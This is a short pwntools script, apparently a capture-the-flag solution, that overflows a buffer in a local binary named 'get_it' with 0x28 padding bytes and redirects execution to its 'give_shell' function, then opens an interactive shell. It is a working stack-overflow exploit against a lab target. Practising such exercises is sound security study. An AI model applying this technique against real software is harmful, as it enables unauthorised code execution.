#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./get_it")
p = process(elf.path)

payload = b"A" * 0x28
payload += p64(elf.symbols["give_shell"])

p.sendline(payload)
p.interactive()
